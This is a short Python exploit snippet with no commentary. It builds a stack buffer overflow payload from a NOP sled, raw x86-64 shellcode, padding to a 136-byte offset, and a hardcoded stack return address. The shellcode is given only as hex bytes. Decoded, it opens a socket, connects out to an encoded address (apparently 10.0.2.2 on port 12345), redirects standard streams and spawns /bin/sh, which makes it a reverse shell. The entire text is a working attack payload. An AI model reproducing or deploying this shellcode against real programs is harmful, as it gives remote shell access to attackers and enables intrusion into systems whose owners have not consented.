ret_addr = b"\x00\x00\x7f\xff\xff\xff\xdc\xc4"[::-1]

buf = b"\x90"*20
buf += 	b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
buf += 	b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xcf"
buf += 	b"\xc6\xf5\xff\xfd\xfd\x48\xf7\xd9\x51\x54"
buf += 	b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
buf += 	b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
buf += 	b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
buf += 	b"\x51\x54\x5f\x0f\x05"
buf += b"\x90"*(136-len(buf)) + ret_addr
    
print(buf)
